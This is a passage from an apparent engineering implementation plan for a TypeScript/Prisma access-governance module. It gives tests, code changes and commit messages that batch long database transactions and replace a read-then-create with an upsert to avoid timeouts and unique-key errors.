        // 1,700 kept" reads as complete until somebody asks what happened to
        // the other 79.
        untouched,
      },
    });
  });

  return { reopened, kept, untouched };
}
```

Add `parseSubjectKey` to the file's imports from `./types.js` — the existing import is `import { RESOURCE_KINDS, known, percentOf, type ResourceKind, type Tri } from './types.js';`, so it becomes:

```ts
import {
  RESOURCE_KINDS,
  known,
  parseSubjectKey,
  percentOf,
  type ResourceKind,
  type Tri,
} from './types.js';
```

- [ ] **Step 6: Run the tests to verify they pass**

Run: `npx vitest run packages/core/src/govern/campaign-service.test.ts`

Expected: PASS, including the two pre-existing re-base cases with their updated `toEqual`.

- [ ] **Step 7: Add the budget case, both halves**

Add to the slice-2 `describe` in `packages/core/src/govern/transaction-budget.test.ts`:

```ts
  it('re-bases a 2,000-item campaign with no transaction over the budget', async () => {
    await seedOrdinaryCampaign();
    await startCampaign(tenantId, actorUserId, campaignId, { now: NOW });
    // Re-basing onto the SAME snapshot: nothing changed, so every item is
    // `kept` and what is being measured is the traversal rather than the
    // writes. That is the honest lower bound, and the unbounded case below is
    // what proves the number means anything.
    const { result, slowest } = await timedTransactions(() =>
      rebaseCampaign(tenantId, actorUserId, campaignId, snapshotId),
    );
    expect(result.kept + result.reopened).toBe(ITEMS);
    expect(slowest).toBeLessThan(BUDGET_MS);
  }, 300_000);

  it('FAILS when the re-base is unbounded — the mutation this case exists for', async () => {
    // EXECUTED, not documented. §8 rule 2 makes this the trap rather than the
    // slowdown: a campaign past `maxSnapshotAgeDays` MUST be re-based before
    // its revocations can execute, so a re-base that cannot finish leaves the
    // batch permanently unexecutable.
    await seedOrdinaryCampaign();
    await startCampaign(tenantId, actorUserId, campaignId, { now: NOW });

    let aborted = false;
    const { slowest } = await timedTransactions(async () => {
      try {
        await rebaseCampaign(tenantId, actorUserId, campaignId, snapshotId, {
          batchSize: Number.MAX_SAFE_INTEGER,
        });
      } catch {
        aborted = true;
      }
    });

    const breached = aborted || slowest > BUDGET_MS;
    expect(breached).toBe(true);
  }, 300_000);
```

Add `rebaseCampaign` to the file's import from `./campaign-service.js`.

- [ ] **Step 8: Run the budget cases**

Run: `GOVERN_BUDGET_MS=4500 npx vitest run packages/core/src/govern/transaction-budget.test.ts -t 're-base'`

Expected: PASS both.

- [ ] **Step 9: Typecheck and commit**

Run: `npx tsc -b`
Expected: exit 0.

```bash
git add packages/core/src/govern/campaign-service.ts \
        packages/core/src/govern/campaign-service.test.ts \
        packages/core/src/govern/transaction-budget.test.ts
git commit -m "$(cat <<'MSG'
fix(govern): re-base in batches, and only where a re-base has something to say

rebaseCampaign was one transaction with an update per item, and section 8
rule 2 makes that a trap rather than a slowdown: a campaign whose snapshot
has aged past maxSnapshotAgeDays must be re-based before its revocations
can execute, and section 13's guard refuses the batch outright otherwise.
A 20,000-item campaign hit P2028 partway and rolled back entirely, so the
only path out of the block was the function that could not finish, and the
batch was permanently unexecutable. Now paged at REBASE_BATCH, with the
campaign move and the audit event in their own short transaction.

And it considered item status not at all. `undecided` is terminal --
"the campaign closed and nobody decided this item" -- and went back to
pending, resurrecting a decision nobody made. A revocation_dispatched item
whose removal Provision applied is absent from the next snapshot, which is
the outcome and not a disappearance, and was overwritten to moot. Both are
now left exactly as they are and counted as `untouched`, which is on the
audit event too: "1,840 items, 61 re-opened, 1,700 kept" reads as complete
until somebody asks about the other 79.

The certification projection is the composition hazard the docstring
already named, in both directions. A KEPT item keeps its row, because a
certification of a holding that has not changed is still good. An item
re-opened FROM certified loses it, because the holding changed and the row
would otherwise say a named human attested to facts nobody showed them.

And a closed campaign cannot be re-based at all: it has no revocations
left to unblock, its coverage figure is signed, and every re-opened item
would be refused by recordCampaignDecision anyway.
MSG
)"
```

---

### Task 7: The nightly build's own two — the gain cross-reference and the read-then-create

Spec §6.1 — **G12** (the gain/audit cross-reference updates per row inside one transaction) and **G23** (SoD violation detection reads-then-creates). Grouped because both run inside `runSnapshotJob` and both take the whole night's work down with them.

**G12.** After the diff, one `withTenant` reads every `gained` `HoldingEvent`, reads two days of audit events, and then issues one `update` **per gain**. After a bulk provisioning run — the day the change report matters most — that exceeds the ceiling, `buildSnapshot`'s catch marks the whole snapshot `failed`, and the night's holdings, findings and diff are lost. `explained = false` on a gain is described in this file's own comment as "the most valuable row this system produces", and it is produced by the loop that kills the build.

**G23.** `detectSodViolations` opens one transaction per violation doing `findUnique` then `create`, with no upsert. A manual snapshot overlapping the nightly one raises P2002; the job throws, `reconcileFindings` never runs, and rows for earlier persons are already committed — so the tenant is left with half a detection pass and no reconciliation.

**Resolution chosen for G23:** an `upsert` on the natural key, not a `singletonKey` on the queue. Serialising the job would make a manual snapshot wait behind a nightly build that takes an hour, and the read-then-create is wrong on its own terms regardless of what schedules it — the natural key exists and the code was not using it. `Scheduler.enqueue` has no singleton option and adding one would touch every subsystem's job registration.

**Files:**
- Modify: `packages/core/src/govern/snapshot-service.ts:44-45` (add `GAIN_LINK_BATCH`) and `:405-455` (the cross-reference block)
- Modify: `packages/core/src/govern/sod-service.ts:266-290` (the per-violation write)
- Test: `packages/core/src/govern/snapshot-service.test.ts`, `packages/core/src/govern/sod-service.test.ts`

**Interfaces:**
- Consumes: `withTenant` from `@syntra/db`; the file-local `chunk` helper in `snapshot-service.ts`; `SodViolation`'s `@@unique([tenantId, ruleId, personId])`, addressed in Prisma as `tenantId_ruleId_personId`.
- Produces: no signature change to `buildSnapshot` or `detectSodViolations`. New export `export const GAIN_LINK_BATCH = 200;` from `snapshot-service.ts`, so the budget test can unbound it.

- [ ] **Step 1: Write the failing test for the cross-reference**

Add to `packages/core/src/govern/snapshot-service.test.ts`:

```ts
/**
 * The cross-reference that used to end the build.
 *
 * `explained = false` on a gain is, in this file's own words, "the most
 * valuable row this system produces": access appeared and SYNTRA DID NOT CAUSE
 * IT. It was produced by a loop issuing one `update` per gain inside a single
 * transaction -- so after a bulk provisioning run, which is the day the change
 * report matters most, it blew the 5000 ms ceiling, `buildSnapshot`'s catch
 * marked the whole snapshot `failed`, and the night's holdings, findings and
 * diff went with it.
 */
describe('the gain / audit cross-reference', () => {
  const holdingOf = (personId: string, resourceId: string, asOf: Date) => ({
    subject: { kind: 'person' as const, personId },
    systemKind: 'syntra' as const,
    systemId: 'syntra',
    systemName: 'Syntra',
    resourceKind: 'group' as const,
    resourceId,
    resourceName: `Group ${resourceId}`,
    state: 'held' as const,
    observedAt: asOf,
    observedVia: 'syntra',
    attribution: { kind: 'direct' as const, detail: 'assignment' },
  });

  it('marks a gain EXPLAINED when an audit event accounts for it', async () => {
    const personId = (
      await withTenant(tenantId, (tx) =>
        tx.person.create({ data: { tenantId, displayName: 'Maya Okafor' } }),
      )
    ).id;

    await buildSnapshot(tenantId, { now: NOW, collect: async () => emptyCollection() });

    await withTenant(tenantId, (tx) =>
      recordEvent(tx, {
        actorUserId: null,
        action: 'rbac.role.assign',
        targetType: 'User',
        targetId: null,
        outcome: 'success',
        sourceIp: null,
        payload: { personId, resourceId: 'g1' },
      }),
    );

    const later = new Date(NOW.getTime() + 3_600_000);
    const built = await buildSnapshot(tenantId, {
      now: later,
      collect: async () =>
        emptyCollection({
          asOf: later,
          personIds: [personId],
          personsWithActiveContract: 1,
          holdings: [holdingOf(personId, 'g1', later)],
        }),
    });

    const events = await withTenant(tenantId, (tx) =>
      tx.holdingEvent.findMany({ where: { toSnapshotId: built.snapshotId, change: 'gained' } }),
    );
    expect(events).toHaveLength(1);
    expect(events[0]!.explained).toBe(true);
    expect(events[0]!.auditEventSequence).not.toBeNull();
  });

  it('leaves a gain UNEXPLAINED when nothing accounts for it', async () => {
    // The row this whole pass exists to produce.
    const personId = (
      await withTenant(tenantId, (tx) =>
        tx.person.create({ data: { tenantId, displayName: 'Maya Okafor' } }),
      )
    ).id;

    await buildSnapshot(tenantId, { now: NOW, collect: async () => emptyCollection() });
    const later = new Date(NOW.getTime() + 3_600_000);
    const built = await buildSnapshot(tenantId, {
      now: later,
      collect: async () =>
        emptyCollection({
          asOf: later,
          personIds: [personId],
          personsWithActiveContract: 1,
          holdings: [holdingOf(personId, 'g2', later)],
        }),
    });

    const events = await withTenant(tenantId, (tx) =>
      tx.holdingEvent.findMany({ where: { toSnapshotId: built.snapshotId, change: 'gained' } }),
    );
    expect(events[0]!.explained).toBe(false);
    expect(events[0]!.auditEventSequence).toBeNull();
  });

  it('links every gain when there are more of them than one batch', async () => {
    // The batching itself, over a population larger than `GAIN_LINK_BATCH`, so
    // a paging bug shows as a count rather than as a slow test.
    const people = await withTenant(tenantId, (tx) =>
      Promise.all(
        Array.from({ length: GAIN_LINK_BATCH + 5 }, (_unused, i) =>
          tx.person.create({ data: { tenantId, displayName: `Person ${i}` } }),
        ),
      ),
    );

    await buildSnapshot(tenantId, { now: NOW, collect: async () => emptyCollection() });
    await withTenant(tenantId, async (tx) => {
      for (const p of people) {
        await recordEvent(tx, {
          actorUserId: null,
          action: 'rbac.role.assign',
          targetType: 'User',
          targetId: null,
          outcome: 'success',
          sourceIp: null,
          payload: { personId: p.id, resourceId: 'g1' },
        });
      }
    });

    const later = new Date(NOW.getTime() + 3_600_000);
    const built = await buildSnapshot(tenantId, {
      now: later,
      collect: async () =>
        emptyCollection({
          asOf: later,
          personIds: people.map((p) => p.id),
          personsWithActiveContract: people.length,
          holdings: people.map((p) => holdingOf(p.id, 'g1', later)),
        }),
    });

    const explained = await withTenant(tenantId, (tx) =>
      tx.holdingEvent.count({ where: { toSnapshotId: built.snapshotId, explained: true } }),
    );
    expect(explained).toBe(people.length);
  });
});
```

Add `GAIN_LINK_BATCH` to the file's import from `./snapshot-service.js`.

- [ ] **Step 2: Run it to verify the batching case fails**

Run: `npx vitest run packages/core/src/govern/snapshot-service.test.ts -t 'cross-reference'`

Expected: FAIL on the third case with `Cannot find module` / `GAIN_LINK_BATCH is not defined`. The first two may pass — they are the behaviour this task must not change, and they are here so the rewrite is measured against them.

- [ ] **Step 3: Add the batch constant**

In `packages/core/src/govern/snapshot-service.ts`, beside `export const EVENT_WRITE_BATCH = 500;`:

```ts
/**
 * GAINS PER CROSS-REFERENCE TRANSACTION.
 *
 * Smaller than `EVENT_WRITE_BATCH` because that constant sizes a `createMany`
 * -- one statement per page -- while this one sizes a page whose worst case is
 * one `updateMany` per DISTINCT audit sequence in it. 200 keeps that under the
 * 5000 ms ceiling with room for a loaded machine.
 *
 * It used to be one `update` per gain inside a single transaction covering the
 * whole snapshot. After a bulk provisioning run -- the day the change report
 * matters most -- that exceeded the ceiling, `buildSnapshot`'s catch marked the
 * snapshot `failed`, and the night's holdings, findings and diff were lost with
 * it.
 */
export const GAIN_LINK_BATCH = 200;
```

- [ ] **Step 4: Split the cross-reference into a read and a paged write**

Replace the whole `await withTenant(tenantId, async (tx) => { const gains = ... });` block (lines 409–455) with:

```ts
      // Cross-reference each gain to the audit event that explains it, where
      // one exists. `explained = false` on a gain is the most valuable row this
      // system produces: access appeared, and SYNTRA DID NOT CAUSE IT. It is
      // only meaningful once this pass has run, which is why
      // `detectUnexplainedGains` is called here rather than in the detect stage.
      //
      // THREE SHAPES, NOT ONE TRANSACTION. The explanation map is built once in
      // its own short transaction; the gains are then paged; and each page's
      // writes are grouped BY SEQUENCE so a page costs one `updateMany` per
      // distinct explaining event rather than one `update` per gain. A bulk
      // provisioning run produces thousands of gains that share a handful of
      // sequences, which is exactly the shape the grouping is for.
      const bySubject = await withTenant(tenantId, async (tx) => {
        const since = previous === null ? new Date(0) : collected.asOf;
        const candidates = await tx.auditEvent.findMany({
          where: {
            occurredAt: { gte: new Date(since.getTime() - 86_400_000 * 2) },
            action: {
              in: [
                'provision.apply.grant_entitlement',
                'automate.grant.fulfilled',
                'access.assignment.create',
                'directory.group.add_member',
                'rbac.role.assign',
              ],
            },
          },
          select: { sequence: true, targetId: true, payload: true },
        });
        const map = new Map<string, number>();
        for (const event of candidates) {
          const payload = event.payload as Record<string, unknown>;
          const person = typeof payload['personId'] === 'string' ? payload['personId'] : null;
          const resource =
            typeof payload['resourceId'] === 'string'
              ? payload['resourceId']
              : typeof payload['entitlementId'] === 'string'
                ? payload['entitlementId']
                : null;
          if (person !== null && resource !== null) map.set(`${person}|${resource}`, event.sequence);
        }
        return map;
      });

      if (bySubject.size > 0) {
        let gainCursor: string | null = null;
        for (;;) {
          const page: { id: string; personId: string | null; resourceId: string }[] =
            await withTenant(tenantId, (tx) =>
              tx.holdingEvent.findMany({
                where: {
                  toSnapshotId: snapshotId,
                  change: 'gained',
                  ...(gainCursor === null ? {} : { id: { gt: gainCursor } }),
                },
                select: { id: true, personId: true, resourceId: true },
                orderBy: { id: 'asc' },
                take: GAIN_LINK_BATCH,
              }),
            );
          if (page.length === 0) break;
          gainCursor = page[page.length - 1]!.id;

          const idsBySequence = new Map<number, string[]>();
          for (const gain of page) {
            if (gain.personId === null) continue;
            const sequence = bySubject.get(`${gain.personId}|${gain.resourceId}`);
            if (sequence === undefined) continue;
            idsBySequence.set(sequence, [...(idsBySequence.get(sequence) ?? []), gain.id]);
          }
          if (idsBySequence.size === 0) continue;

          await withTenant(tenantId, async (tx) => {
            for (const [sequence, ids] of idsBySequence) {
              await tx.holdingEvent.updateMany({
                where: { id: { in: ids } },
                data: { auditEventSequence: sequence, explained: true },
              });
            }
          });
        }
      }
```

- [ ] **Step 5: Run the snapshot tests**

Run: `npx vitest run packages/core/src/govern/snapshot-service.test.ts packages/core/src/govern/diff.test.ts`

Expected: PASS, all three new cases and every pre-existing one.

- [ ] **Step 6: Write the failing test for the read-then-create**

Add to `packages/core/src/govern/sod-service.test.ts`:

```ts
/**
 * TWO DETECTION PASSES AT ONCE, which is not exotic: an administrator pressing
 * "Build snapshot" while the nightly job is running produces exactly this.
 *
 * `detectSodViolations` did `findUnique` then `create` per violation with no
 * upsert, so the second pass raised P2002 on
 * `@@unique([tenantId, ruleId, personId])`. The job threw,
 * `reconcileFindings` never ran, and the rows for persons earlier in the
 * iteration were already committed -- so the tenant was left with half a
 * detection pass and no reconciliation, and the SoD board showed a number
 * nobody could explain.
 */
describe('two overlapping detection passes', () => {
  it('converge on one violation row instead of raising P2002', async () => {
    const snapshotId = await seedViolatingSnapshot();

    const [first, second] = await Promise.all([
      detectSodViolations(tenantId, snapshotId, { now: NOW }),
      detectSodViolations(tenantId, snapshotId, { now: NOW }),
    ]);

    expect(first.open).toBe(1);
    expect(second.open).toBe(1);
    expect(await withTenant(tenantId, (tx) => tx.sodViolation.count())).toBe(1);
  });
});
```

`seedViolatingSnapshot()` is whatever the file already uses to produce one person on both sides of one rule — read the existing `describe('detectSodViolations')` block and reuse its fixture verbatim rather than writing a second one.

- [ ] **Step 7: Run it to verify it fails**

Run: `npx vitest run packages/core/src/govern/sod-service.test.ts -t 'overlapping detection'`

Expected: FAIL with Prisma `P2002` on `SodViolation_tenantId_ruleId_personId_key`.

- [ ] **Step 8: Use the natural key that already exists**

In `packages/core/src/govern/sod-service.ts`, replace the `await withTenant(tenantId, async (tx) => { const existing = ... })` block (lines 267–290) with:

```ts
      await withTenant(tenantId, async (tx) => {
        const data = {
          severity: rule.severity,
          status: outcome.kind === 'unevaluable' ? 'unevaluable' : 'open',
          holdingsA: (outcome.kind === 'violation' ? outcome.holdingsA : []) as never,
          holdingsB: (outcome.kind === 'violation' ? outcome.holdingsB : []) as never,
          contractsA: (outcome.kind === 'violation' ? outcome.contractsA : []) as never,
          contractsB: (outcome.kind === 'violation' ? outcome.contractsB : []) as never,
          lastSeenAt: now,
          lastSnapshotId: snapshotId,
        };

        // AN ACTIVE EXCEPTION HOLDS, and it has to be checked before the write
        // rather than instead of it. Reopening an `excepted` violation every
        // night would make a deliberate risk acceptance a decision somebody
        // re-makes daily; §15 says a lapse is the only thing that reopens one.
        const existing = await tx.sodViolation.findUnique({
          where: { tenantId_ruleId_personId: { tenantId, ruleId, personId } },
          select: { id: true, status: true },
        });
        if (existing !== null && existing.status === 'excepted' && outcome.kind === 'violation') {
          await tx.sodViolation.update({
            where: { id: existing.id },
            data: { lastSeenAt: now, lastSnapshotId: snapshotId },
          });
          return;
        }

        // UPSERT ON THE NATURAL KEY, which was there all along.
        //
        // `findUnique` then `create` raised P2002 the moment two detection
        // passes overlapped -- an administrator pressing "Build snapshot" while
        // the nightly job runs is all it takes. The job threw,
        // `reconcileFindings` never ran, and the rows for persons earlier in the
        // iteration were already committed, so the tenant was left with half a
        // detection pass and no reconciliation.
        //
        // NOT a singletonKey on the queue instead. Serialising would make a
        // manual snapshot wait behind an hour-long nightly build, and the
        // read-then-create is wrong on its own terms whatever schedules it: the
        // unique index exists and the code was not using it. `Scheduler.enqueue`
        // has no singleton option either, and adding one would touch every
        // subsystem's job registration for a defect that lives here.
        await tx.sodViolation.upsert({
          where: { tenantId_ruleId_personId: { tenantId, ruleId, personId } },
          create: { tenantId, ruleId, personId, firstSeenAt: now, ...data },
          update: data,
        });
      });
```

- [ ] **Step 9: Run the SoD tests**

Run: `npx vitest run packages/core/src/govern/sod-service.test.ts`

Expected: PASS, including the pre-existing "a violation that persists across snapshots is updated, never duplicated" and the exception-holds case.

- [ ] **Step 10: Run the job that composes both**

Run: `npx vitest run packages/core/src/govern/jobs.test.ts`

Expected: PASS. `runSnapshotJob` calls `buildSnapshot` and then `detectSodViolations`, which is the sequence both defects lived in.

- [ ] **Step 11: Typecheck and commit**

Run: `npx tsc -b`
Expected: exit 0.

```bash
git add packages/core/src/govern/snapshot-service.ts \
        packages/core/src/govern/snapshot-service.test.ts \
        packages/core/src/govern/sod-service.ts \
        packages/core/src/govern/sod-service.test.ts
git commit -m "$(cat <<'MSG'
fix(govern): the two ways the nightly build took itself down

The gain cross-reference read every gained HoldingEvent, read two days of
audit events, and then issued one update PER GAIN, all in one transaction.
After a bulk provisioning run -- the day the change report matters most --
that exceeded the 5000 ms ceiling, buildSnapshot's catch marked the whole
snapshot failed, and the night's holdings, findings and diff went with it.
The row it was producing, `explained = false` on a gain, is the one this
file's own comment calls the most valuable row the system produces.

Three shapes now: the explanation map in one short transaction, the gains
paged at GAIN_LINK_BATCH, and each page's writes grouped BY SEQUENCE so a
page costs one updateMany per distinct explaining event rather than one
update per gain. A bulk provisioning run is thousands of gains sharing a
handful of sequences, which is what the grouping is for.

And detectSodViolations did findUnique then create per violation, so two
overlapping passes -- an administrator pressing Build snapshot while the
nightly job runs -- raised P2002 on the unique index that was already
there. The job threw, reconcileFindings never ran, and the rows for
earlier persons were already committed. Upsert on the natural key. Not a
singletonKey on the queue: that would make a manual snapshot wait behind
an hour-long build, and the read-then-create is wrong whatever schedules
it.
MSG
)"
```

---

### Task 8: The four sweeps and the two reports that hold one transaction open

Spec §6.1 — **G22**. Four places wrap a per-row loop in one `withTenant`, several of them with a per-row `recordEvent` that takes a **per-tenant advisory lock** for the duration of its transaction. The first three run inside `runSnapshotJob` **after earlier stages have committed**, so an abort retries the whole job and builds a second snapshot.

- `sweepExceptions` / `lapse` — `exception-service.ts:359-427,437`
- `detectDecisionGraph` — every decision, every grant and the full snapshot holdings in one transaction — `sod-service.ts:625-782`
- `sweepAcceptedFindings` — `finding-service.ts:566-597`
- `whoHasAccessToSystem` — unbounded `person` and `contract` reads; `whatChanged` reads a whole quarter of audit events and returns all of them — `report-service.ts:150-156,527-537`

None is covered by the budget suite.

**Resolution chosen:** the shape this codebase already uses everywhere else — **a short transaction returning plain data, then per-item work in its own short transaction.** For the two reports the answer is different, because they are reads that a person is waiting on: scope the reads to the rows the answer actually needs, and put an explicit, stated cap on the one that cannot be scoped.

**Files:**
- Modify: `packages/core/src/govern/exception-service.ts:355-435` (`sweepExceptions`)
- Modify: `packages/core/src/govern/finding-service.ts:561-597` (`sweepAcceptedFindings`)
- Modify: `packages/core/src/govern/sod-service.ts:642-782` (`detectDecisionGraph`'s single `withTenant`)
- Modify: `packages/core/src/govern/report-service.ts:157-163` and `:546-580`
- Test: `packages/core/src/govern/transaction-budget.test.ts`, `packages/core/src/govern/report-service.test.ts`

**Interfaces:**
- Consumes: `withTenant`, `type TenantClient` from `@syntra/db`; `loadSodFacts(tx, snapshotId?)` from `./sod-service.js` (unchanged — Provision calls it inside its own transactions and it must keep taking a `tx`); `governSettings(tx)`.
- Produces:
  - `export const SWEEP_BATCH = 100;` from `exception-service.ts` and `finding-service.ts` (each its own constant; they page different tables).
  - `sweepExceptions(tenantId, options?: { now?: Date; publicUrl?: string; batchSize?: number })` — same return shape.
  - `sweepAcceptedFindings(tenantId, now, options?: { batchSize?: number })` — **third parameter added**, optional; `jobs.ts`'s call site passes two arguments and needs no change.
  - `ChangeReport` gains `recordedActionsTruncated: boolean` and `AUDIT_ACTIONS_LIMIT`; `apps/web` types the change report locally, so the console compiles unchanged.

- [ ] **Step 1: Write the failing budget cases**

Add to the slice-2 `describe` in `packages/core/src/govern/transaction-budget.test.ts`:

```ts
  it('sweeps exceptions and accepted findings within the budget', async () => {
    // These two run inside `runSnapshotJob`, AFTER earlier stages have
    // committed, so an abort retries the whole job and builds a SECOND
    // snapshot. Both wrap a per-row loop in one transaction, and `lapse` calls
    // `recordEvent` per row -- which takes a per-tenant advisory lock for the
    // duration of its transaction, so the loop serialises every other audited
    // action in the tenant behind it.
    await seedOrdinaryCampaign();
    await seedManyExceptionsAndAcceptedFindings(600);

    const sweepTiming = await timedTransactions(() =>
      sweepExceptions(tenantId, { now: new Date(NOW.getTime() + 400 * 86_400_000) }),
    );
    expect(sweepTiming.result.lapsed).toBe(600);
    expect(sweepTiming.slowest).toBeLessThan(BUDGET_MS);

    const findingTiming = await timedTransactions(() =>
      sweepAcceptedFindings(tenantId, new Date(NOW.getTime() + 400 * 86_400_000)),
    );
    expect(findingTiming.result.lapsed).toBe(600);
    expect(findingTiming.slowest).toBeLessThan(BUDGET_MS);
  }, 300_000);

  it('FAILS when the exception sweep is unbounded — the mutation this case exists for', async () => {
    await seedOrdinaryCampaign();
    await seedManyExceptionsAndAcceptedFindings(600);

    let aborted = false;
    const { slowest } = await timedTransactions(async () => {
      try {
        await sweepExceptions(tenantId, {
          now: new Date(NOW.getTime() + 400 * 86_400_000),
          batchSize: Number.MAX_SAFE_INTEGER,
        });
      } catch {
        aborted = true;
      }
    });
    expect(aborted || slowest > BUDGET_MS).toBe(true);
  }, 300_000);

  it('builds the decision graph over the seeded tenant within the budget', async () => {
    await seedOrdinaryCampaign();
    const { slowest } = await timedTransactions(() =>
      detectDecisionGraph(tenantId, snapshotId, { now: NOW }),
    );
    expect(slowest).toBeLessThan(BUDGET_MS);
  }, 300_000);
```

Write `seedManyExceptionsAndAcceptedFindings(n)` beside `seedLargeCampaign`, using `createMany` for every row — a seed written row by row inside one `withTenant` would itself exceed the budget this file measures, and a seed that trips the instrument tells you nothing about the code. It needs, per index: a `BusinessFunction` pair and a `SodRule` (one rule is enough — the exceptions differ by person), a `SodViolation` per subject person, a `SodException` with `status: 'active'` and an `endsAt` in the past, and a `GovernFinding` with `status: 'accepted'` and an `acceptedUntil` in the past. Read the models in `packages/db/prisma/schema.prisma` for the required columns before writing it.

- [ ] **Step 2: Run them to verify they fail**

Run: `GOVERN_BUDGET_MS=4500 npx vitest run packages/core/src/govern/transaction-budget.test.ts -t 'sweep'`

Expected: FAIL — `batchSize` is not an option yet, and the bounded case aborts at Prisma's ceiling because there is no batching at all.

- [ ] **Step 3: Page `sweepExceptions`**

In `packages/core/src/govern/exception-service.ts`, add above `sweepExceptions`:

```ts
/**
 * EXCEPTIONS PER SWEEP TRANSACTION.
 *
 * 100 rather than 200, because `lapse` is heavy per row: it updates the
 * exception, updates the violation, reads and updates the finding, resolves
 * recipients, enqueues outbox rows, and calls `recordEvent` -- which takes a
 * PER-TENANT ADVISORY LOCK for the duration of its transaction. So a loop over
 * every active exception in one transaction does not merely risk the 5000 ms
 * ceiling, it serialises every other audited action in the tenant behind
 * itself while it runs.
 *
 * And this sweep runs inside `runSnapshotJob`, AFTER earlier stages have
 * committed, so an abort here retries the whole job and builds a second
 * snapshot -- which is how one slow sweep turned into two nights of inventory.
 */
export const EXCEPTION_SWEEP_BATCH = 100;
```

Then restructure the function. Replace the `return withTenant(tenantId, async (tx) => { ... });` body with:

```ts
  const now = options.now ?? new Date();
  const batchSize = options.batchSize ?? EXCEPTION_SWEEP_BATCH;

  const settings = await withTenant(tenantId, (tx) => governSettings(tx));

  let warned = 0;
  let lapsed = 0;
  let lapsedByContract = 0;

  // A SHORT TRANSACTION RETURNING PLAIN DATA, then per-batch work in its own.
  // Paged by id, not by status: `lapse` moves rows out of `active`, so a
  // status-only page would be re-read as "the next page" and a warning-only
  // page would loop forever.
  let cursor: string | null = null;
  for (;;) {
    const page = await withTenant(tenantId, (tx) =>
      tx.sodException.findMany({
        where: { status: 'active', ...(cursor === null ? {} : { id: { gt: cursor } }) },
        include: { rule: true },
        orderBy: { id: 'asc' },
        take: batchSize,
      }),
    );
    if (page.length === 0) break;
    cursor = page[page.length - 1]!.id;

    const outcome = await withTenant(tenantId, async (tx) => {
      let pageWarned = 0;
      let pageLapsed = 0;
      let pageByContract = 0;

      for (const exception of page) {
        // The one place an exception ends early without a human, and it is safe
        // because ending an exception TAKES NOTHING AWAY FROM ANYBODY -- it
        // reopens a finding. Where the stated basis is a pair of concurrent
        // contracts, the justification stopped being true when one of them
        // ended.
        const basis = (exception.basisContractIds as string[] | null) ?? [];
        if (basis.length > 0) {
          const stillRunning = await tx.contract.count({
            where: { id: { in: basis }, OR: [{ endDate: null }, { endDate: { gte: now } }] },
          });
          if (stillRunning < basis.length) {
            await lapse(
              tx,
              tenantId,
              exception,
              now,
              'a contract its justification rested on has ended',
            );
            pageLapsed += 1;
            pageByContract += 1;
            continue;
          }
        }

        if (exception.endsAt <= now) {
          await lapse(tx, tenantId, exception, now, 'it reached its end date and was not renewed');
          pageLapsed += 1;
          continue;
        }

        if (!shouldWarn(exception.endsAt, now, settings.exceptionWarningDays)) continue;

        const parties = await recipientsForPersons(
          tx,
          [exception.personId, exception.approvedByPersonId].filter(
            (x): x is string => typeof x === 'string',
          ),
        );
        const names = await displayNames(tx, { personIds: [exception.personId] });
        await enqueueOutbox(
          tx,
          parties.map((recipient) => ({
            template: 'govern-exception-expiring' as const,
            to: recipient.email,
            vars: {
              displayName: recipient.displayName,
              ruleName: exception.rule.name,
              beneficiaryName: names.get(`person:${exception.personId}`) ?? 'the beneficiary',
              endsAt: exception.endsAt.toDateString(),
              // Renewal is a NEW exception with a new decision, pre-filled with
              // the old justification. Never auto-renewal, which is approval by
              // inattention wearing a different hat.
              renewUrl: `${options.publicUrl ?? ''}/admin/govern/sod/exceptions/new?renew=${exception.id}`,
            },
            requestId: null,
            userId: recipient.userId,
          })),
        );
        pageWarned += 1;
      }

      return { pageWarned, pageLapsed, pageByContract };
    });

    warned += outcome.pageWarned;
    lapsed += outcome.pageLapsed;
    lapsedByContract += outcome.pageByContract;
  }

  return { warned, lapsed, lapsedByContract };
```

and widen the options type to `{ now?: Date; publicUrl?: string; batchSize?: number }`.

`shouldWarn` is Task 13's function — **if Task 13 has not landed, keep the existing line here verbatim** (`const daysLeft = Math.ceil(...); if (!settings.exceptionWarningDays.includes(daysLeft)) continue;`) and let Task 13 replace it. Do not implement it twice.

- [ ] **Step 4: Page `sweepAcceptedFindings`**

In `packages/core/src/govern/finding-service.ts`, add above the function:

```ts
/**
 * FINDINGS PER SWEEP TRANSACTION.
 *
 * Every row does an update plus a `recordEvent`, and `recordEvent` takes a
 * per-tenant advisory lock for the duration of its transaction -- so a loop
 * over every lapsing acceptance in one transaction serialises every other
 * audited action in the tenant behind itself. This sweep runs inside
 * `runSnapshotJob` after earlier stages have committed, so an abort retries the
 * whole job and builds a second snapshot.
 */
export const FINDING_SWEEP_BATCH = 100;
```

and replace the body with:

```ts
export async function sweepAcceptedFindings(
  tenantId: string,
  now: Date,
  options: { batchSize?: number } = {},
): Promise<{ lapsed: number }> {
  const batchSize = options.batchSize ?? FINDING_SWEEP_BATCH;
  let lapsed = 0;

  // No cursor needed: every row this page touches leaves `status: 'accepted'`,
  // so the same query returns the NEXT page. That is only true because the
  // update is unconditional on the row it read -- if a later change makes a
  // sweep able to leave a row `accepted`, this becomes an infinite loop and
  // must become a cursor.
  for (;;) {
    const page = await withTenant(tenantId, (tx) =>
      tx.governFinding.findMany({
        where: { status: 'accepted', acceptedUntil: { lt: now } },
        select: { id: true, severity: true, detail: true },
        orderBy: { id: 'asc' },
        take: batchSize,
      }),
    );
    if (page.length === 0) break;

    await withTenant(tenantId, async (tx) => {
      for (const finding of page) {
        const raised = raiseSeverity(finding.severity as Severity);
        await tx.governFinding.update({
          where: { id: finding.id },
          data: {
            status: 'open',
            severity: raised,
            acceptedUntil: null,
            detail: {
              ...(finding.detail as Record<string, unknown>),
              lapsedAcceptanceAt: now.toISOString(),
            } as never,
          },
        });
        await recordEvent(tx, {
          actorUserId: null,
          action: 'govern.finding.acceptance_lapsed',
          targetType: 'GovernFinding',
          targetId: finding.id,
          outcome: 'success',
          sourceIp: null,
          payload: { raisedTo: raised },
        });
      }
    });

    lapsed += page.length;
  }

  return { lapsed };
}
```

- [ ] **Step 5: Split `detectDecisionGraph`'s one transaction**

In `packages/core/src/govern/sod-service.ts`, replace `const input = await withTenant(tenantId, async (tx): Promise<GraphInput> => { ... });` with a sequence of short transactions that each return plain data. Keep every query and every comment exactly as it is; only the transaction boundaries move:

```ts
  // FIVE SHORT TRANSACTIONS RETURNING PLAIN DATA, not one.
  //
  // This function read every approval decision, every delegated request, every
  // auto-granted request, every unattributed request, every live grant and the
  // FULL SNAPSHOT HOLDINGS inside a single `withTenant`. It runs inside
  // `runSnapshotJob` after earlier stages have committed, so exceeding the 5000
  // ms ceiling retried the whole job and built a second snapshot.
  //
